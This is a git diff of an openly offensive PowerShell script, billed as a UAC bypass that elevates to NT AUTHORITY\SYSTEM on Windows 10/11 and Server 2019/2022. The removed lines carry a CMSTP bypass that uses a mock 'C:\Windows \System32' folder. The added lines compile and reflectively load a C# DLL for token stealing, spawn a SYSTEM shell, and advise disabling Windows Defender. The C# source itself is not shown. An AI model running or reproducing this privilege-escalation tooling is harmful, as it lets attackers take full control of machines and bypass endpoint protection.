@@ -1,10 +1,10 @@
-# Author: P.Hoogeveen | aka: x0xr00t | Team: Sl0ppyRoot
-# Name: UAC Bypass for Windows 10 and Server 2019/2022
-# The main .ps1 file been re-dev by dev: @keytrap-x86 (partial, os version check) Thanks sir (Y)
-# Build: 20241007
-# Name: UAC Bypass Win Server 2019| Win Server 2022 | Win 10 | Win 11 | win 12 pre-release
-# Impact: Privilege Escalation
-# Method: DllReflection and CMSTP Bypass
+<#
+    Author: P.Hoogeveen | aka: x0xr00t
+    Name: UAC & System Elevation Wrapper
+    Method: C# Reflection / Token Stealing
+    Description: Bypasses UAC and elevates to SYSTEM using C# reflection and token manipulation.
+    Updated: Added OS version check for Windows 10, 11, Server 2019/2022
+#>
 
 function Get-PSLocation {
     $paths = @(
@@ -18,54 +18,100 @@ function Get-PSLocation {
         }
     }
 
-    Write-Host "PowerShell location not found." -ForegroundColor Red
+    Write-Host "[-] PowerShell location not found." -ForegroundColor Red
     exit
 }
 
-function Check-Assembly {
-    param (
-        [string]$assemblyName
+function Invoke-X0x-Bypass {
+    $workPath = "$env:TEMP\X0X_Work"
+    $dllPath = Join-Path $workPath "sl0p.dll"
+    $csFile = Join-Path $PSScriptRoot "sl0puacb.cs"
+
+    # 1. Check if the C# source file exists
+    if (-not (Test-Path $csFile)) {
+        Write-Host "[-] Error: $csFile not found in the current directory!" -ForegroundColor Red
+        return
+    }
+
+    # 2. Create working directory if it doesn't exist
+    if (-not (Test-Path $workPath)) {
+        New-Item -Path $workPath -ItemType Directory -Force | Out-Null
+    }
+
+    # 3. Compile the C# code with required assemblies
+    Write-Host "[*] OS: $((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').ProductName)" -ForegroundColor Cyan
+    Write-Host "[*] Compiling C# source code..." -ForegroundColor Yellow
+
+    $Assemblies = @(
+        "System",
+        "System.Drawing",
+        "System.Windows.Forms",
+        "System.Runtime.InteropServices",
+        "System.Security"
     )
+
     try {
-        [void][Reflection.Assembly]::LoadWithPartialName($assemblyName) | Out-Null
-        Write-Host "Assembly $assemblyName is accessible."
+        $sourceCode = Get-Content $csFile -Raw
+        Add-Type -TypeDefinition $sourceCode `
+                 -ReferencedAssemblies $Assemblies `
+                 -OutputAssembly $dllPath `
+                 -OutputType Library
+        Write-Host "[+] Compilation successful: $dllPath" -ForegroundColor Green
     } catch {
-        Write-Host "Assembly $assemblyName is not accessible." -ForegroundColor Red
-        Write-Host "Attempting to load the assembly..."
-        # Optionally, you could handle a fallback or log the error here
+        Write-Host "[-] Compilation error: $_" -ForegroundColor Red
+        return
     }
-}
 
-# Function to find the CMSTPProfile.inf file
-function Get-CMSTPProfilePath {
-    $searchLocations = @(
-        "C:\windows \system32", # Add your custom path here
-        "$env:USERPROFILE\Documents",
-        "$env:ProgramData",
-        "$env:Temp"
-    )
+    # 4. Load DLL via memory reflection (byte array)
+    try {
+        $bytes = [IO.File]::ReadAllBytes($dllPath)
+        [System.Reflection.Assembly]::Load($bytes) | Out-Null
+        Write-Host "[+] DLL successfully loaded into memory via reflection." -ForegroundColor Green
+    } catch {
+        Write-Host "[-] Load failed: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host "[!] Tip: Try 'Unblock-File $csFile' or temporarily disable Windows Defender." -ForegroundColor Yellow
+        return
+    }
 
-    foreach ($location in $searchLocations) {
-        $profilePath = Join-Path -Path $location -ChildPath "CMSTPProfile.inf"
-        if (Test-Path $profilePath) {
-            Write-Host "Found CMSTPProfile at: $profilePath"
-            return $profilePath
+    # 5. Execute the Main routine from the C# code
+    Write-Host "[*] Initializing elevation to SYSTEM..." -ForegroundColor Magenta
+    try {
+        [Program]::Main(@())
+        Start-Sleep -Seconds 2
+
+        $newIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        Write-Host "[*] New Context: $newIdentity" -ForegroundColor Cyan
+
+        if ($newIdentity -like "*SYSTEM*") {
+            Write-Host "[!!!] SUCCESS: You are now running as NT AUTHORITY\SYSTEM!" -ForegroundColor Green
+            Write-Host "[*] Spawning new SYSTEM shell..." -ForegroundColor Yellow
+
+            # Spawn a new red-themed SYSTEM shell and close the current terminal
+            $PSLocation = Get-PSLocation
+            $command = @"
+                `$Host.UI.RawUI.BackgroundColor = 'DarkRed'
+                `$Host.UI.RawUI.ForegroundColor = 'White'
+                Clear-Host
+                Write-Host '[!!!] You are now NT AUTHORITY\SYSTEM. Type `exit` to end the session.' -ForegroundColor Yellow
+                Write-Host '[*] Current user: ' -NoNewline -ForegroundColor Cyan
+                Write-Host "$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" -ForegroundColor Green
+"@
+            Start-Process -FilePath "$PSLocation" -ArgumentList "-NoExit", "-Command", $command -Verb RunAs -WindowStyle Normal
+            exit
+        } else {
+            Write-Host "[?] SYSTEM context not obtained. Try running PowerShell as Administrator." -ForegroundColor Yellow
         }
+    } catch {
+        Write-Host "[-] Error executing Main: $_" -ForegroundColor Red
     }
-
-    Write-Host "CMSTPProfile.inf not found in the specified locations." -ForegroundColor Red
-    return $null
 }
 
-$PSLocation = Get-PSLocation
-
+# --- OS Version Check ---
 Write-Host "---------------------------------------"
 Write-Host " Sl0ppyR00t: Checking OS version..."
 Write-Host "---------------------------------------"
 
-$user = (cmd.exe /c echo %username%)
 $OSVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName).ProductName
-
 $supportedVersions = @(
     "Windows 10 Home",
     "Windows 10 Pro",
@@ -94,83 +140,19 @@ $supportedVersions = @(
 )
 
 if ($supportedVersions -notcontains $OSVersion) {
-    Write-Host "Unsupported OS version: $OSVersion"
+    Write-Host "[-] Unsupported OS version: $OSVersion" -ForegroundColor Red
     exit
 } else {
-    Write-Host "Running on supported OS: $OSVersion"
+    Write-Host "[+] Running on supported OS: $OSVersion" -ForegroundColor Green
 }
 
-# Create a mock folder
-$mockFolderPath = "C:\Windows\ System32\"
-if (-not (Test-Path $mockFolderPath)) {
-    New-Item -Path $mockFolderPath -ItemType Directory | Out-Null
-    Write-Host "Mock folder created at $mockFolderPath."
-}
-
-# Check if cmstp.exe is available
-$cmstpPath = "$env:SystemRoot\System32\cmstp.exe"
-if (-not (Test-Path $cmstpPath)) {
-    Write-Host "cmstp.exe not found. Copying files to MockFolder..."
-
-    # Path to source files
-    $sourceFolder = "C:\cmstp\files"
-    $filesToCopy = @("cmstp.exe", "cmstp.dll", "cmstp.inf", "cmstp.exe.mui")
-
-    # Copy files to MockFolder
-    foreach ($file in $filesToCopy) {
-        $sourceFile = Join-Path -Path $sourceFolder -ChildPath $file
-        $destinationFile = Join-Path -Path $mockFolderPath -ChildPath $file
-        Copy-Item -Path $sourceFile -Destination $destinationFile -Force
-        Write-Host "Copied $file to $mockFolderPath."
-    }
-} else {
-    Write-Host "cmstp.exe is already installed at $cmstpPath."
-}
-
-# Check for System.Windows.Forms assembly accessibility
-Check-Assembly -assemblyName "System.Windows.Forms"
-
-# Compiling DLLs
-Write-Host "Compiling DLL files..."
-Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$mockFolderPath\sl0p.dll"
-Write-Host "DLL files created."
-
-# Copy DLL files to System32
-Copy-Item "$mockFolderPath\sl0p.dll" -Destination "C:\Windows \System32\sl0p.dll" -Force
-Write-Host "DLL copied to System32."
-
-# Verify DLL placement
-if (Test-Path "C:\Windows \System32\sl0p.dll") {
-    Write-Host "DLL verification successful."
-} else {
-    Write-Host "DLL not found in System32." -ForegroundColor Red
-}
-
-# Load DLL
-[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$mockFolderPath\sl0p.dll"))
-
-# Check for admin privileges
-$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    # Start a new elevated PowerShell session in System32
-    Start-Process -FilePath "$PSLocation" -ArgumentList '-NoExit', '-File', $myinvocation.MyCommand.Definition -Verb RunAs -WorkingDirectory 'C:\Windows\System32'
+# --- Start the procedure ---
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "[!] WARNING: This script requires Administrator privileges." -ForegroundColor Red
+    $PSLocation = Get-PSLocation
+    Start-Process -FilePath "$PSLocation" -ArgumentList '-NoExit', '-File', $MyInvocation.MyCommand.Definition -Verb RunAs
     exit
 }
 
-    if ($null -ne $cmstpProfilePath) {
-        Start-Process "cmstp.exe" -ArgumentList "/s", $cmstpProfilePath
-    } else {
-        Write-Host "Skipping CMSTP bypass due to missing profile." -ForegroundColor Red
-    }
-
-# Display Group Policy Results
-Write-Host "Getting user scope..."
-gpresult /Scope User /v
-
-Write-Host "Getting system scope..."
-gpresult /Scope Computer /v
-
-Write-Host "Getting LUA Settings..."
-Get-ItemProperty HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system
-
-Write-Host "________________________"
+Invoke-X0x-Bypass
